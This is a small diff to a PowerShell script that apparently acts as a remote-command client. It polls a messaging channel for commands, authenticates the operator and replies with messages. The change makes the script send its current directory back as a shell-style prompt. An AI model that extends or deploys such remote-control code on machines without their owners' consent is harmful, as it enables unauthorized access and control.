@@ -1301,6 +1301,8 @@ Function Authenticate{
         $script:authenticated = 1
         $script:previouscmd = $response
         ConnectMsg
+	$dir = $PWD.Path
+	sendMsg -Message "``PS | $dir>``"
     }
     else{
         Write-Host "$env:COMPUTERNAME Not authenticated"
@@ -1321,7 +1323,7 @@ while($true){
 
     PullMsg
     if (!($response -like "$previouscmd")) {
-
+	$dir = $PWD.Path
         Write-Output "Command found!"
         if($authenticated -ne 1){
             if ($response -like "ShowAll") {
